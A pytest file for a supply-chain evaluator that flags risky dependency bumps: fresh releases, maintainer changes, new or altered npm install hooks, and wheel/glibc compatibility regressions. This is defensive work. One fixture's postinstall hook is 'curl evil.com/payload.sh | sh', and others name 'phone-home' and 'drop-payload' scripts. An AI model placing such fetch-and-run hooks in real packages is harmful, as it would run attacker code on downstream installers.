"""Tests for ``packages.sca.bump.evaluator``.

The evaluator emits ``SupplyChainFinding`` rows for bump-tier
detectors; ``review._compute_verdict`` consumes them via the
``bump_supply_chain_findings=`` parameter. These tests cover the
recent_publish detector (Phase 1.b's only detector); subsequent
detectors get their own test groups."""

from __future__ import annotations

from datetime import datetime, timezone
from typing import Any, Dict, Optional


from packages.sca.bump.evaluator import evaluate_bump_supply_chain


# ---------------------------------------------------------------------------
# Stub registry clients
# ---------------------------------------------------------------------------

class _StubPyPIClient:
    """Minimal stand-in for ``PyPIClient`` exposing ``get_metadata``
    with operator-supplied per-version upload times."""

    def __init__(self, packages: Dict[str, Dict[str, Any]]):
        self._packages = packages

    def get_metadata(self, name: str) -> Optional[Dict[str, Any]]:
        return self._packages.get(name)


class _StubNpmClient:
    """Minimal stand-in for ``NpmClient`` exposing ``get_metadata``
    with operator-supplied per-version time map."""

    def __init__(self, packages: Dict[str, Dict[str, Any]]):
        self._packages = packages

    def get_metadata(self, name: str) -> Optional[Dict[str, Any]]:
        return self._packages.get(name)


# ---------------------------------------------------------------------------
# recent_publish detector
# ---------------------------------------------------------------------------

def test_recent_publish_target_published_today_fires() -> None:
    """Target version published <30 days ago → ``recent_publish``
    finding at medium severity. The rapid-release window is the
    most defensible bump-tier signal: an attacker publishes
    malicious v1.2.4 and hopes auto-bumpers pull it in before
    takedown."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    pypi = _StubPyPIClient({
        "django": {"releases": {
            "4.2.30": [{"upload_time_iso_8601": "2026-05-10T00:00:00Z"}],
        }},
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="PyPI", name="django",
        current_version="4.2.10", target_version="4.2.30",
        pypi_client=pypi, npm_client=None, now=now,
    )
    assert len(findings) == 1
    f = findings[0]
    assert f.kind == "recent_publish"
    assert f.severity == "medium"
    assert "2026-05-10" in f.detail
    # Evidence carries machine-readable fields for the PR-comment renderer.
    assert f.evidence["age_days"] == 1
    assert f.evidence["target_version"] == "4.2.30"


def test_recent_publish_target_older_than_threshold_silent() -> None:
    """Target published >30 days ago → no finding. The detector
    is silent unless the rapid-release window is open."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    pypi = _StubPyPIClient({
        "django": {"releases": {
            "4.2.26": [{"upload_time_iso_8601": "2025-12-01T00:00:00Z"}],
        }},
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="PyPI", name="django",
        current_version="4.2.10", target_version="4.2.26",
        pypi_client=pypi, npm_client=None, now=now,
    )
    assert findings == []


def test_recent_publish_npm_target_recent_fires() -> None:
    """npm packument's ``time[version]`` field gives the
    per-version publish timestamp. Target <30 days ago → finding."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    npm = _StubNpmClient({
        "lodash": {"time": {
            "4.17.30": "2026-04-30T12:00:00.000Z",
        }},
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="npm", name="lodash",
        current_version="4.17.21", target_version="4.17.30",
        pypi_client=None, npm_client=npm, now=now,
    )
    assert len(findings) == 1
    assert findings[0].kind == "recent_publish"
    # Apr 30 12:00 → May 11 00:00 = 10 days 12 hours; timedelta.days
    # floors to whole 24-hour periods.
    assert findings[0].evidence["age_days"] == 10


def test_recent_publish_threshold_boundary() -> None:
    """A target published exactly at the threshold boundary is
    NOT flagged (strict less-than comparison). Off-by-one
    matters: an operator who set the threshold to 30 days
    expects "no flag at 30 days old" — they'd already have moved
    past the rapid-release window."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    pypi = _StubPyPIClient({
        "foo": {"releases": {
            "1.0.0": [{"upload_time_iso_8601": "2026-04-11T00:00:00Z"}],
        }},
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="PyPI", name="foo",
        current_version="0.9", target_version="1.0.0",
        pypi_client=pypi, npm_client=None, now=now,
        rapid_release_days=30,
    )
    assert findings == []


def test_recent_publish_custom_threshold() -> None:
    """Operators with stricter policies can tighten the rapid-
    release window. A 60-day window flags a 45-day-old release;
    a 14-day window doesn't flag a 21-day-old release."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    pypi = _StubPyPIClient({
        "foo": {"releases": {
            "1.0.0": [{"upload_time_iso_8601": "2026-03-27T00:00:00Z"}],
        }},
    })
    strict = evaluate_bump_supply_chain(
        ecosystem="PyPI", name="foo",
        current_version="0.9", target_version="1.0.0",
        pypi_client=pypi, npm_client=None, now=now,
        rapid_release_days=60,
    )
    assert len(strict) == 1

    relaxed = evaluate_bump_supply_chain(
        ecosystem="PyPI", name="foo",
        current_version="0.9", target_version="1.0.0",
        pypi_client=pypi, npm_client=None, now=now,
        rapid_release_days=14,
    )
    assert relaxed == []


def test_missing_target_version_in_releases_silent() -> None:
    """Target version not listed in registry's releases map → no
    finding (can't compute the date). The bumper sees an empty
    list and falls through to vuln-only verdict."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    pypi = _StubPyPIClient({
        "foo": {"releases": {"0.9": []}},   # 1.0.0 unknown
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="PyPI", name="foo",
        current_version="0.9", target_version="1.0.0",
        pypi_client=pypi, npm_client=None, now=now,
    )
    assert findings == []


def test_unsupported_ecosystem_returns_empty() -> None:
    """Ecosystems without per-version publish-date lookup
    (Maven / Cargo / Go / others — future-detector territory)
    return [] silently. The bumper treats the absence as "no
    bump-tier signal available" and falls through."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    findings = evaluate_bump_supply_chain(
        ecosystem="Maven", name="org.foo:bar",
        current_version="1.0", target_version="2.0",
        pypi_client=None, npm_client=None, now=now,
    )
    assert findings == []


def test_missing_client_for_ecosystem_returns_empty() -> None:
    """If the right ecosystem client is None (e.g. caller built
    a PyPI scan without an NpmClient and is then evaluating an
    npm bump), we get [] silently rather than raising."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    findings = evaluate_bump_supply_chain(
        ecosystem="npm", name="x",
        current_version="1", target_version="2",
        pypi_client=None, npm_client=None, now=now,
    )
    assert findings == []


def test_registry_returns_none_handled_gracefully() -> None:
    """Registry-client ``get_metadata`` returns None (404 / offline /
    cache miss) → no finding, no exception."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    pypi = _StubPyPIClient({})       # empty: every lookup returns None
    findings = evaluate_bump_supply_chain(
        ecosystem="PyPI", name="missing",
        current_version="1", target_version="2",
        pypi_client=pypi, npm_client=None, now=now,
    )
    assert findings == []


def test_finding_id_includes_target_version() -> None:
    """Bump-tier findings include the target version in their
    finding_id so repeat-bump-evaluations don't dedup against
    each other in the bumper's PR-comment renderer."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    pypi = _StubPyPIClient({
        "x": {"releases": {
            "2.0.0": [{"upload_time_iso_8601": "2026-05-10T00:00:00Z"}],
        }},
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="PyPI", name="x",
        current_version="1.0", target_version="2.0.0",
        pypi_client=pypi, npm_client=None, now=now,
    )
    assert "2.0.0" in findings[0].finding_id
    assert "PyPI" in findings[0].finding_id


# ---------------------------------------------------------------------------
# maintainer_change detector (npm-only initially)
# ---------------------------------------------------------------------------

def _npm_packument_with_maintainers(name: str, **versions) -> dict:
    """Helper: build a minimal npm packument with per-version
    maintainer lists. ``versions`` is keyword-keyed like
    ``v1_0_0=[{"name":"alice"}]`` and we replace ``_`` with ``.``
    to recover the version string."""
    out = {"name": name, "versions": {}}
    for kw, maintainers in versions.items():
        ver = kw.lstrip("v").replace("_", ".")
        out["versions"][ver] = {"maintainers": maintainers}
    return out


def test_maintainer_change_added_maintainer_fires() -> None:
    """Target version added a new maintainer not in current's
    maintainer list. Event-stream / ua-parser-js shape — the
    operationally common takeover signal."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    npm = _StubNpmClient({
        "ua-parser-js": _npm_packument_with_maintainers(
            "ua-parser-js",
            v0_7_28=[{"name": "faisalman"}],
            v0_7_29=[{"name": "faisalman"},
                      {"name": "compromised-attacker"}],
        ),
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="npm", name="ua-parser-js",
        current_version="0.7.28", target_version="0.7.29",
        pypi_client=None, npm_client=npm, now=now,
    )
    # Find the maintainer_change finding (recent_publish may also
    # fire depending on dates; we just check this one is present).
    mc = [f for f in findings if f.kind == "maintainer_change"]
    assert len(mc) == 1
    f = mc[0]
    assert f.severity == "medium"
    assert "compromised-attacker" in f.evidence["added"]
    assert "compromised-attacker" in f.detail


def test_maintainer_change_unchanged_set_silent() -> None:
    """Same maintainers in both versions → no finding. The
    common case for routine patch bumps."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    npm = _StubNpmClient({
        "lodash": _npm_packument_with_maintainers(
            "lodash",
            v4_17_20=[{"name": "jdalton"}],
            v4_17_21=[{"name": "jdalton"}],
        ),
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="npm", name="lodash",
        current_version="4.17.20", target_version="4.17.21",
        pypi_client=None, npm_client=npm, now=now,
    )
    assert [f for f in findings if f.kind == "maintainer_change"] == []


def test_maintainer_change_removed_maintainer_fires() -> None:
    """Target dropped a maintainer present in current. The
    handover-out direction is equally informative (someone
    retired / had their access revoked / left the project)."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    npm = _StubNpmClient({
        "x": _npm_packument_with_maintainers(
            "x",
            v1_0_0=[{"name": "alice"}, {"name": "bob"}],
            v2_0_0=[{"name": "alice"}],
        ),
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="npm", name="x",
        current_version="1.0.0", target_version="2.0.0",
        pypi_client=None, npm_client=npm, now=now,
    )
    mc = [f for f in findings if f.kind == "maintainer_change"]
    assert len(mc) == 1
    assert "bob" in mc[0].evidence["removed"]


def test_maintainer_change_case_insensitive_match() -> None:
    """Maintainer names are case-folded for comparison. ``Alice``
    and ``alice`` should match — npm shows mixed casing in real
    packuments depending on tooling."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    npm = _StubNpmClient({
        "x": _npm_packument_with_maintainers(
            "x",
            v1_0_0=[{"name": "Alice"}],
            v2_0_0=[{"name": "alice"}],
        ),
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="npm", name="x",
        current_version="1.0.0", target_version="2.0.0",
        pypi_client=None, npm_client=npm, now=now,
    )
    assert [f for f in findings if f.kind == "maintainer_change"] == []


def test_maintainer_change_pypi_returns_no_finding() -> None:
    """PyPI has no per-version maintainer history in the public
    API. The detector returns no finding for PyPI bumps — the
    bumper falls through to vuln-only verdict for these. (Future
    follow-up: operator-side maintainer cache.)"""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    pypi = _StubPyPIClient({
        "django": {"releases": {
            "4.2.10": [{"upload_time_iso_8601": "2025-01-01T00:00:00Z"}],
            "4.2.30": [{"upload_time_iso_8601": "2025-02-01T00:00:00Z"}],
        }, "info": {"maintainer": "whoever"}},
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="PyPI", name="django",
        current_version="4.2.10", target_version="4.2.30",
        pypi_client=pypi, npm_client=None, now=now,
    )
    assert [f for f in findings if f.kind == "maintainer_change"] == []


def test_maintainer_change_missing_version_silent() -> None:
    """Either version missing from the packument → silent skip
    (can't compare what isn't there)."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    npm = _StubNpmClient({
        "x": _npm_packument_with_maintainers(
            "x",
            v1_0_0=[{"name": "alice"}],
        ),
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="npm", name="x",
        current_version="1.0.0", target_version="2.0.0",   # absent
        pypi_client=None, npm_client=npm, now=now,
    )
    assert [f for f in findings if f.kind == "maintainer_change"] == []


def test_maintainer_change_recent_publish_compound_two_mediums() -> None:
    """End-to-end check that the evaluator emits two mediums
    when target is BOTH recently published AND has a different
    maintainer set. This is the compound-red-flag case the
    verdict ladder turns into Block."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    npm = _StubNpmClient({
        "x": {
            "name": "x",
            "versions": {
                "1.0.0": {"maintainers": [{"name": "alice"}]},
                "1.0.1": {"maintainers": [
                    {"name": "alice"}, {"name": "attacker"},
                ]},
            },
            "time": {
                "1.0.1": "2026-05-09T00:00:00.000Z",   # 2 days ago
            },
        },
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="npm", name="x",
        current_version="1.0.0", target_version="1.0.1",
        pypi_client=None, npm_client=npm, now=now,
    )
    kinds = sorted(f.kind for f in findings)
    assert kinds == ["maintainer_change", "recent_publish"]
    assert all(f.severity == "medium" for f in findings)


# ---------------------------------------------------------------------------
# install_hook_delta detector (npm-only initially)
# ---------------------------------------------------------------------------

def test_install_hook_delta_postinstall_added_fires() -> None:
    """Target version adds a ``postinstall`` script the current
    version didn't have. Classic event-stream / colors.js
    payload-injection shape — the bump introduces install-time
    code execution against downstream consumers."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    npm = _StubNpmClient({
        "x": {"name": "x", "versions": {
            "1.0.0": {
                "maintainers": [{"name": "alice"}],
                "scripts": {},
            },
            "1.0.1": {
                "maintainers": [{"name": "alice"}],
                "scripts": {
                    "postinstall": "node ./scripts/phone-home.js",
                },
            },
        }},
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="npm", name="x",
        current_version="1.0.0", target_version="1.0.1",
        pypi_client=None, npm_client=npm, now=now,
    )
    hooks = [f for f in findings if f.kind == "install_hook_suspicious"]
    assert len(hooks) == 1
    f = hooks[0]
    assert f.severity == "medium"
    assert f.evidence["change_type"] == "added"
    assert "postinstall" in f.evidence["added_hooks"]
    # Hook body is in evidence so reviewers can see what it runs.
    assert "phone-home" in f.evidence["hook_bodies"]["postinstall"]


def test_install_hook_delta_unchanged_silent() -> None:
    """Both versions have the same install-time hooks → no
    finding. A bump that doesn't change install-time behaviour
    is fine on this axis."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    scripts = {"postinstall": "node-gyp rebuild"}
    npm = _StubNpmClient({
        "native-lib": {"name": "native-lib", "versions": {
            "1.0.0": {"maintainers": [{"name": "x"}], "scripts": scripts},
            "1.0.1": {"maintainers": [{"name": "x"}], "scripts": scripts},
        }},
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="npm", name="native-lib",
        current_version="1.0.0", target_version="1.0.1",
        pypi_client=None, npm_client=npm, now=now,
    )
    assert [f for f in findings
             if f.kind == "install_hook_suspicious"] == []


def test_install_hook_delta_removed_hook_silent() -> None:
    """Target REMOVED a hook → no finding. Removing install-time
    code is strictly safer; not a supply-chain concern."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    npm = _StubNpmClient({
        "x": {"name": "x", "versions": {
            "1.0.0": {
                "maintainers": [{"name": "x"}],
                "scripts": {"postinstall": "do-thing"},
            },
            "1.0.1": {
                "maintainers": [{"name": "x"}],
                "scripts": {},
            },
        }},
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="npm", name="x",
        current_version="1.0.0", target_version="1.0.1",
        pypi_client=None, npm_client=npm, now=now,
    )
    assert [f for f in findings
             if f.kind == "install_hook_suspicious"] == []


def test_install_hook_delta_preinstall_and_install_both_count() -> None:
    """``preinstall`` / ``install`` / ``postinstall`` all matter
    for downstream supply-chain. ``prepublish*`` runs on the
    publisher's machine only — out of scope."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    npm = _StubNpmClient({
        "x": {"name": "x", "versions": {
            "1.0.0": {"maintainers": [{"name": "x"}], "scripts": {}},
            "1.0.1": {
                "maintainers": [{"name": "x"}],
                "scripts": {
                    "preinstall": "echo hi",
                    "install": "node compile.js",
                    "prepublish": "this should NOT count",
                },
            },
        }},
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="npm", name="x",
        current_version="1.0.0", target_version="1.0.1",
        pypi_client=None, npm_client=npm, now=now,
    )
    hooks = [f for f in findings if f.kind == "install_hook_suspicious"]
    assert len(hooks) == 1
    added = hooks[0].evidence["added_hooks"]
    assert "preinstall" in added
    assert "install" in added
    assert "prepublish" not in added


def test_install_hook_delta_empty_string_hook_treated_as_absent() -> None:
    """``scripts.postinstall = ""`` is a no-op for npm; treating
    an empty-string hook as "present" would cause spurious
    findings on packages that toggle the empty-string convention
    between versions."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    npm = _StubNpmClient({
        "x": {"name": "x", "versions": {
            "1.0.0": {
                "maintainers": [{"name": "x"}],
                "scripts": {"postinstall": ""},
            },
            "1.0.1": {
                "maintainers": [{"name": "x"}],
                "scripts": {"postinstall": ""},
            },
        }},
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="npm", name="x",
        current_version="1.0.0", target_version="1.0.1",
        pypi_client=None, npm_client=npm, now=now,
    )
    assert [f for f in findings
             if f.kind == "install_hook_suspicious"] == []


def test_install_hook_delta_pypi_returns_no_finding() -> None:
    """PyPI's setup.py-based install hooks need sdist download +
    AST parse to detect. Out of scope for the per-version
    metadata path. Deferred — bumper falls through to vuln-only
    verdict for PyPI bumps on this axis."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    pypi = _StubPyPIClient({
        "x": {"releases": {"2.0": []}},
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="PyPI", name="x",
        current_version="1.0", target_version="2.0",
        pypi_client=pypi, npm_client=None, now=now,
    )
    assert [f for f in findings
             if f.kind == "install_hook_suspicious"] == []


def test_install_hook_delta_hook_body_truncated() -> None:
    """Hook bodies are truncated in evidence to keep the
    PR-comment renderer's output bounded. Cap is 200 chars."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    long_script = "echo " + "a" * 500
    npm = _StubNpmClient({
        "x": {"name": "x", "versions": {
            "1.0.0": {"maintainers": [{"name": "x"}], "scripts": {}},
            "1.0.1": {
                "maintainers": [{"name": "x"}],
                "scripts": {"postinstall": long_script},
            },
        }},
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="npm", name="x",
        current_version="1.0.0", target_version="1.0.1",
        pypi_client=None, npm_client=npm, now=now,
    )
    hook_body = next(f for f in findings
                      if f.kind == "install_hook_suspicious"
                      ).evidence["hook_bodies"]["postinstall"]
    assert len(hook_body) <= 200


def test_install_hook_delta_body_change_fires() -> None:
    """Target keeps the same install-hook NAME but swaps its
    BODY. Modern supply-chain attack shape: stolen-credential
    push keeps ``postinstall`` named the same to dodge the
    "added hook" tell, but replaces ``node-gyp rebuild`` with
    ``curl evil.com | sh``. The body-change detector catches
    what the set-difference added-hook detector misses."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    npm = _StubNpmClient({
        "x": {"name": "x", "versions": {
            "1.0.0": {
                "maintainers": [{"name": "alice"}],
                "scripts": {"postinstall": "node-gyp rebuild"},
            },
            "1.0.1": {
                "maintainers": [{"name": "alice"}],
                "scripts": {
                    "postinstall": "curl evil.com/payload.sh | sh",
                },
            },
        }},
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="npm", name="x",
        current_version="1.0.0", target_version="1.0.1",
        pypi_client=None, npm_client=npm, now=now,
    )
    hooks = [f for f in findings if f.kind == "install_hook_suspicious"]
    assert len(hooks) == 1
    f = hooks[0]
    assert f.severity == "medium"
    assert f.evidence["change_type"] == "body_change"
    assert "postinstall" in f.evidence["changed_hooks"]
    diff = f.evidence["body_diff"]["postinstall"]
    assert "node-gyp" in diff["current"]
    assert "evil.com" in diff["target"]


def test_install_hook_delta_added_and_body_change_compound() -> None:
    """A bump that BOTH adds a new hook AND mutates an existing
    hook's body emits two findings. Two mediums → Block via the
    verdict ladder — the compound shape is more suspicious than
    either alone."""
    from packages.sca.review import _VERDICT_BLOCK, _compute_verdict
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    npm = _StubNpmClient({
        "x": {"name": "x", "versions": {
            "1.0.0": {
                "maintainers": [{"name": "alice"}],
                "scripts": {"postinstall": "node-gyp rebuild"},
            },
            "1.0.1": {
                "maintainers": [{"name": "alice"}],
                "scripts": {
                    # body mutated
                    "postinstall": "node-gyp rebuild && node phone.js",
                    # AND a new hook added
                    "preinstall": "node prep.js",
                },
            },
        }},
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="npm", name="x",
        current_version="1.0.0", target_version="1.0.1",
        pypi_client=None, npm_client=npm, now=now,
    )
    hook_findings = [f for f in findings
                     if f.kind == "install_hook_suspicious"]
    change_types = sorted(f.evidence["change_type"]
                          for f in hook_findings)
    assert change_types == ["added", "body_change"]
    verdict = _compute_verdict(
        [], [], bump_supply_chain_findings=findings,
    )
    assert verdict == _VERDICT_BLOCK


def test_install_hook_delta_body_whitespace_only_silent() -> None:
    """Whitespace-only body change (cosmetic reformat) doesn't
    fire — we strip both sides before comparing so spurious
    findings on a leading-newline edit don't poison the ladder."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    npm = _StubNpmClient({
        "x": {"name": "x", "versions": {
            "1.0.0": {
                "maintainers": [{"name": "alice"}],
                "scripts": {"postinstall": "node-gyp rebuild"},
            },
            "1.0.1": {
                "maintainers": [{"name": "alice"}],
                "scripts": {"postinstall": "  node-gyp rebuild  "},
            },
        }},
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="npm", name="x",
        current_version="1.0.0", target_version="1.0.1",
        pypi_client=None, npm_client=npm, now=now,
    )
    assert [f for f in findings
             if f.kind == "install_hook_suspicious"] == []


def test_install_hook_compounded_with_recent_publish_blocks() -> None:
    """End-to-end: target version is both recently published AND
    introduces a new postinstall hook. Two mediums → Block.
    This is one of the most dangerous shapes — fresh release
    plus install-time payload."""
    from packages.sca.review import _VERDICT_BLOCK, _compute_verdict
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    npm = _StubNpmClient({
        "x": {
            "name": "x",
            "versions": {
                "1.0.0": {
                    "maintainers": [{"name": "x"}],
                    "scripts": {},
                },
                "1.0.1": {
                    "maintainers": [{"name": "x"}],
                    "scripts": {"postinstall": "node ./drop-payload.js"},
                },
            },
            "time": {"1.0.1": "2026-05-09T00:00:00.000Z"},
        },
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="npm", name="x",
        current_version="1.0.0", target_version="1.0.1",
        pypi_client=None, npm_client=npm, now=now,
    )
    kinds = sorted(f.kind for f in findings)
    assert kinds == ["install_hook_suspicious", "recent_publish"]
    verdict = _compute_verdict([], [], bump_supply_chain_findings=findings)
    assert verdict == _VERDICT_BLOCK


def test_pypi_chooses_earliest_upload_time_across_files() -> None:
    """A PyPI release can have multiple distribution files (.whl
    for each platform + .tar.gz source). The earliest upload
    timestamp is the canonical publish moment — picking the
    latest would falsely make the version look more recent than
    it is."""
    now = datetime(2026, 5, 11, tzinfo=timezone.utc)
    pypi = _StubPyPIClient({
        "x": {"releases": {
            "2.0.0": [
                # 60 days ago — outside the 30-day window
                {"upload_time_iso_8601": "2026-03-12T00:00:00Z"},
                # 10 days ago — would be inside the window if picked
                {"upload_time_iso_8601": "2026-05-01T00:00:00Z"},
            ],
        }},
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="PyPI", name="x",
        current_version="1.9", target_version="2.0.0",
        pypi_client=pypi, npm_client=None, now=now,
    )
    # Earliest upload = 60 days ago = outside threshold → no finding.
    assert findings == []


# ---------------------------------------------------------------------------
# platform_compat_regression / _improvement
# ---------------------------------------------------------------------------

def _pypi_with_wheels(packages_releases: dict, *,
                       upload_iso="2025-06-01T00:00:00Z") -> _StubPyPIClient:
    """Build a stub PyPIClient where each version's release list
    carries wheel filenames (for the wheel-tag parser to chew on)
    plus a realistic upload timestamp."""
    pkgs = {}
    for name, vers in packages_releases.items():
        pkgs[name] = {"releases": {}}
        for ver, filenames in vers.items():
            pkgs[name]["releases"][ver] = [
                {"filename": fn, "upload_time_iso_8601": upload_iso}
                for fn in filenames
            ]
    return _StubPyPIClient(pkgs)


def _matrix_with(arch: str, family: str, ver: tuple):
    from packages.sca.platform_matrix import (
        PlatformPair, ProjectPlatformMatrix,
    )
    from packages.sca.platform_matrix.glibc_db import LibcVersion
    matrix = ProjectPlatformMatrix()
    matrix.add(PlatformPair(
        arch=arch, libc=LibcVersion(family, ver), source="test",
    ))
    return matrix


def test_platform_compat_regression_fires_z3_aarch64_glibc236() -> None:
    """The canonical case: current pin installs on aarch64
    glibc 2.36; target pin requires manylinux_2_38 wheels →
    platform_compat_regression with high severity."""
    now = datetime(2026, 5, 15, tzinfo=timezone.utc)
    pypi = _pypi_with_wheels({
        "z3-solver": {
            "4.15.0.0": [
                "z3_solver-4.15.0.0-py3-none-manylinux_2_17_aarch64.whl",
                "z3_solver-4.15.0.0-py3-none-manylinux_2_17_x86_64.whl",
            ],
            "4.16.0.0": [
                "z3_solver-4.16.0.0-py3-none-manylinux_2_38_aarch64.whl",
                "z3_solver-4.16.0.0-py3-none-manylinux_2_17_x86_64.whl",
            ],
        },
    })
    matrix = _matrix_with("aarch64", "glibc", (2, 36))
    findings = evaluate_bump_supply_chain(
        ecosystem="PyPI", name="z3-solver",
        current_version="4.15.0.0", target_version="4.16.0.0",
        pypi_client=pypi, npm_client=None,
        platform_matrix=matrix, now=now,
    )
    regression = [f for f in findings
                  if f.kind == "platform_compat_regression"]
    assert len(regression) == 1
    assert regression[0].severity == "high"
    assert regression[0].evidence["arch"] == "aarch64"
    assert "glibc 2.38" in regression[0].detail
    assert "glibc 2.36" in regression[0].detail


def test_platform_compat_improvement_fires_when_resolved() -> None:
    """Current pin breaks on aarch64; target pin ships a
    compatible wheel → platform_compat_improvement (info)."""
    now = datetime(2026, 5, 15, tzinfo=timezone.utc)
    pypi = _pypi_with_wheels({
        "z3-solver": {
            "4.16.0.0": [
                # current pin: only manylinux_2_38 aarch64, breaks
                # on glibc 2.36
                "z3_solver-4.16.0.0-py3-none-manylinux_2_38_aarch64.whl",
            ],
            "4.17.0.0": [
                # target pin: ships manylinux_2_34 fallback
                "z3_solver-4.17.0.0-py3-none-manylinux_2_34_aarch64.whl",
            ],
        },
    })
    matrix = _matrix_with("aarch64", "glibc", (2, 36))
    findings = evaluate_bump_supply_chain(
        ecosystem="PyPI", name="z3-solver",
        current_version="4.16.0.0", target_version="4.17.0.0",
        pypi_client=pypi, npm_client=None,
        platform_matrix=matrix, now=now,
    )
    improvement = [f for f in findings
                    if f.kind == "platform_compat_improvement"]
    assert len(improvement) == 1
    assert improvement[0].severity == "info"


def test_platform_compat_no_finding_when_both_ok() -> None:
    now = datetime(2026, 5, 15, tzinfo=timezone.utc)
    pypi = _pypi_with_wheels({
        "requests": {
            "2.30.0": ["requests-2.30.0-py3-none-any.whl"],
            "2.31.0": ["requests-2.31.0-py3-none-any.whl"],
        },
    })
    matrix = _matrix_with("aarch64", "glibc", (2, 36))
    findings = evaluate_bump_supply_chain(
        ecosystem="PyPI", name="requests",
        current_version="2.30.0", target_version="2.31.0",
        pypi_client=pypi, npm_client=None,
        platform_matrix=matrix, now=now,
    )
    assert not any(
        "platform_compat" in f.kind for f in findings
    )


def test_platform_compat_skipped_when_no_matrix() -> None:
    """Without a platform_matrix (legacy callers / npm paths),
    the detector silently no-ops."""
    now = datetime(2026, 5, 15, tzinfo=timezone.utc)
    pypi = _pypi_with_wheels({
        "z3-solver": {
            "4.16.0.0": [
                "z3_solver-4.16.0.0-py3-none-manylinux_2_38_aarch64.whl",
            ],
        },
    })
    findings = evaluate_bump_supply_chain(
        ecosystem="PyPI", name="z3-solver",
        current_version="4.15.0.0", target_version="4.16.0.0",
        pypi_client=pypi, npm_client=None,
        platform_matrix=None, now=now,
    )
    assert not any("platform_compat" in f.kind for f in findings)


def test_platform_compat_npm_ecosystem_skipped() -> None:
    """npm doesn't have wheels — the detector is PyPI-only."""
    now = datetime(2026, 5, 15, tzinfo=timezone.utc)
    matrix = _matrix_with("aarch64", "glibc", (2, 36))
    findings = evaluate_bump_supply_chain(
        ecosystem="npm", name="lodash",
        current_version="4.17.20", target_version="4.17.21",
        pypi_client=None, npm_client=None,
        platform_matrix=matrix, now=now,
    )
    assert not any("platform_compat" in f.kind for f in findings)
